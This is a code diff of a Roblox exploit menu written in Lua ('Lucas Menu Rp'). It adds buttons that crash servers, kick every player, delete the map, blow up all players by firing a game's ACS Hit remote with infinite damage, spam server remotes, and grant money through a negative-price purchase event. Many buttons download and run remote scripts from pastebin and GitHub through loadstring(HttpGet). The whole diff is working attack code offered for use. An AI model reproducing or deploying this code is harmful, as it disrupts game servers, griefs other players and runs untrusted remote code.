@@ -7,8 +7,8 @@ OrionLib:MakeNotification({
     Time = 5
 })
 
-
 local Window = OrionLib:MakeWindow({Name = "Lucas Menu Rp", HidePremium = false, SaveConfig = true, ConfigFolder = "Lucas"})
+
 
 --Player Tab--
 
@@ -23,25 +23,33 @@ local PlayerSection = PlayerTab:AddSection({
 })
 
 PlayerSection:AddButton({
-    Name = "Lag server",
+    Name = "Crash Server 1",
     Callback = function(value)
-    print(loadstring(game:HttpGet("https://pastebin.com/raw/HGBJqVMu",true))())
+    print(loadstring(game:HttpGet(("https://raw.githubusercontent.com/GameLeaks2/RobloxScripts/main/CrashServer"),true)))
       end
 })
 
 PlayerSection:AddButton({
-    Name = "Ver chat privado (off)",
+  Name = "Crash Server 2",
+  Callback = function(value)
+  print(loadstring(game:HttpGet("https://raw.githubusercontent.com/arandomuser0/scriptroblox/main/tarantula1.lua",true)))
+    end
+})
+
+PlayerSection:AddButton({
+  Name = "Puxar Geral Bypass (!)",
+  Callback = function(value)
+  print(loadstring(game:HttpGet(("https://raw.githubusercontent.com/GameLeaks2/RobloxScripts/main/BRING%20ALL%20-%20EB'S"),true)))
+    end
+})
+
+PlayerSection:AddButton({
+    Name = "Ver chat privado",
     Callback = function(value)
     print()
       end
 })
 
-PlayerSection:AddButton({
-    Name = "Ver chat privado 2 (off)",
-    Callback = function(value)
-    print()
-      end
-})
 
 local SettingsTab = Window:MakeTab({
     Name = "Funçoes",
@@ -82,13 +90,6 @@ SettingsSection:AddButton({
 })
 
 SettingsSection:AddButton({
-    Name = "LucasMenu V1",
-    Callback = function(value)
-    print(loadstring(game:HttpGet("https://raw.githubusercontent.com/webcriamanca/LucasMenu/main/LucasMenu%20V1",true))() )
-      end
-})
-
-SettingsSection:AddButton({
     Name = "God Mode",
     Callback = function(value)
     print(loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))())
@@ -102,12 +103,6 @@ SettingsSection:AddButton({
       end
 })
 
-SettingsSection:AddButton({
-    Name = "ESP OP",
-    Callback = function(value)
-    print(loadstring(game:HttpGet("https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua",true))())
-      end
-})
 
 SettingsSection:AddButton({
     Name = "kill/fling all (OFF)",
@@ -163,9 +158,95 @@ configSection:AddButton({
 })
 
 configTab:AddButton({
+	Name = "Crash Server - Acs 2.0.1",
+	Callback = function()
+        while task.wait() do
+
+            for _, player in next, game.Players:GetPlayers() do
+               game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
+            end
+          end
+  	end    
+})
+
+configTab:AddButton({
+	Name = "Infinite Stamina Acs 2.0.1",
+	Callback = function()
+        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
+        cfg.EnableStamina = false
+  	end    
+})
+
+configTab:AddButton({
+	Name = "No Fall Damage Acs 2.0.1",
+	Callback = function()
+        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
+        cfg.EnableFallDamage = false
+  	end    
+})
+
+configTab:AddButton({
+	Name = "No Jump Cooldown Acs 2.0.1",
+	Callback = function()
+        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
+        cfg.AntiBunnyHop = false
+  	end    
+})
+
+configTab:AddButton({
+	Name = "Remover Armas",
+	Callback = function()
+        local player = game:GetService("Players").LocalPlayer
+        local backpack = player.Backpack
+
+        for _, item in pairs(backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                item:Destroy()
+            end
+        end
+		end
+})
+
+configTab:AddButton({
+	Name = "Som Hack Acs 2.0.1",
+	Callback = function()
+        while task.wait() do
+
+            for _, player in next, game.Players:GetPlayers() do
+                game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Whizz:FireServer(player)
+            end
+          end
+  	end    
+})
+
+configSection:AddButton({
 	Name = "Give armas - ACS",
 	Callback = function(value)
   print(loadstring(game:HttpGet("https://raw.githubusercontent.com/webcriamanca/puxar-arma/main/Puxador",true))())
+    end
+        
+})
+
+configSection:AddButton({
+	Name = "Auto jjs",
+	Callback = function(value)
+  print(loadstring(game:HttpGet(("https://raw.githubusercontent.com/GameLeaks2/RobloxScripts/main/AUTO-JJS%20ALL%20EB.lua"),true))())
+    end
+        
+})
+
+configSection:AddButton({
+	Name = "Kick all",
+	Callback = function(value)
+  print(loadstring(game:HttpGet("https://pastebin.com/raw/pdW98pEa"))())
+    end
+        
+})
+
+configSection:AddButton({
+	Name = "Deletar Map",
+	Callback = function(value)
+  print(loadstring(game:HttpGet("https://raw.githubusercontent.com/zMarcxzz/delete-all/main/source"))())
     end
         
 })
@@ -175,6 +256,32 @@ configSection:AddButton({
 	Callback = function()
         OrionLib:Destroy()
   	end    
+})
+
+configTab:AddButton({
+  Name = "Creeper Geral - Acs 1.7.5",
+  Callback = function()
+      local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
+for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
+if v:IsA("SpecialMesh") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("Part") and v.Name == "Right Arm" or v.Name == "Left Arm" then
+  rmt:FireServer(v) 
+end
+end
+  end   
+}) 
+
+configTab:AddButton({
+	Name = "Explodir Geral - Acs 1.7.5",
+	Callback = function()
+        local rem,_t,players = game:GetService("ReplicatedStorage").ACS_Engine.Eventos.Hit,{ExplosiveHit=true,ExPressure=math.huge,ExpRadius=math.huge,DestroyJointRadiusPercent=math.huge,ExplosionDamage=math.huge},game:GetService('Players')
+	
+		for i,v in next, players:GetPlayers() do 
+			local ppart = v['Character'].PrimaryPart
+			pcall(function()
+				rem:FireServer(ppart.Position,ppart,ppart.Position,Enum.Material.ForceField,_t)
+			end)
+		end
+  	end 
 })
 
 local EspTab = Window:MakeTab({
@@ -209,8 +316,92 @@ EspSection:AddButton({
 })
 
 EspSection:AddButton({
-  Name = "PUXAR ARMA",
+  Name = "ESP V3",
   Callback = function(value)
   print(loadstring(game:HttpGet("https://raw.githubusercontent.com/webcriamanca/puxar-arma/main/Puxador",true))())
     end
+})
+
+local JogadorTab = Window:MakeTab({
+  Name = "MONEY - LEABOARD",
+  Icon = "",
+  PremiumOnly = false
+})
+
+local Section = JogadorTab:AddSection({
+  Name = "Hub"
+})
+
+JogadorTab:AddButton({
+  Name = "Altera leaboard",
+  Callback = function()
+      loadstring(game:HttpGet(('https://pst.klgrth.io/paste/9dfhy/raw'),true))()
+    end
+})
+
+local Section = moneyTab:AddSection({
+  Name = "Money"
+})
+
+moneyTab:AddButton({
+  Name = "Set Money",
+  Callback = function()
+      local args = {
+          [1] = {
+              [1] = "",
+              [2] = "",
+              [3] = "",
+              [4] = 0,
+              [5] = 19,
+              [6] = -293400000
+          }
+      }
+
+      game:GetService("ReplicatedStorage").EventosRemote.ComprarCarro:FireServer(unpack(args))
+    end
+})
+
+local BypassTab = Window:MakeTab({
+  Name = "Bypass",
+  Icon = "rbxassetid://4483345998",
+  PremiumOnly = false
+})
+
+local bypassSection = BypassTab:AddSection({
+  Name = "Funçoes"
+})
+
+BypassTab:AddButton({
+	Name = "Bypass Stopper",
+	Callback = function()
+        wait(0.5)local ba=Instance.new("ScreenGui")
+        local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
+        local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
+        ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
+        ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
+        ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
+        ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti Kick V9"ca.TextColor3=Color3.new(0,1,1)
+        ca.TextSize=22;da.Parent=ca
+        da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
+        da.Size=UDim2.new(0,370,0,107)_b.Parent=da
+        _b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
+        _b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="Feito por Zrey"
+        _b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
+        ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
+        ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
+        ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
+        game:service'Players'.LocalPlayer.Idled:connect(function()
+        bb:CaptureController()bb:ClickButton2(Vector2.new())
+        ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)
+  	end    
+})
+
+local ADMTab = Window:MakeTab({
+  Name = "ADM",
+  Icon = "rbxassetid://4483345998",
+  PremiumOnly = false
+})
+
+local ADMSection = ADMTab:AddSection({
+  Name = "ADM"
 })
